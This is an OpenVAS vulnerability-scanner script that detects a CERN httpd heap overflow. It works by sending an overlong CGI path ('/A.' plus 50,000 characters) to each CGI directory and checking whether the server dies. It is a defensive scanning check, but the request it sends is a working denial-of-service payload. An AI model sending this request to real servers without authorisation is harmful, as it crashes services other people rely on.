# OpenVAS Vulnerability Test
# $Id: cern_httpd_cginame_overflow.nasl 17 2013-10-27 14:01:43Z jan $
# Description: CERN httpd CGI name heap overflow
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to kill the remobe
web server by requesting 
	GET /cgi-bin/A.AAAA[...]A HTTP/1.0
	
This is known to trigger a heap overflow in some servers like
CERN HTTPD. 
A cracker may use this flaw to disrupt your server. It *might* 
also be exploitable to run malicious code on the machine.";

tag_solution = "Ask your vendor for a patch or move to another server";

if(description)
{
 script_id(17231);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 name = "CERN httpd CGI name heap overflow";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Ask for a too long CGI name containing a dot";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright("This script is Copyright (C) 2005 Michel Arboi");
 family = "Web Servers";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 # script_require_keys("www/cern");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

# I never tested it against a vulnerable server

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if (http_is_dead(port: port)) exit(0);

foreach dir (cgi_dirs())
{
  d = strcat(dir, '/A.', crap(50000));
  req = http_get(item:d, port:port);
  r = http_keepalive_send_recv(port:port, data:req);
  if( r == NULL && http_is_dead(port:port))
  {
    debug_print('HTTP server was killed by GET http://', get_host_name(), ':',
	port, '/', dir, '/A.AAAAAAA[...]A\n');
    security_hole(port);
    exit(0);
  }
}

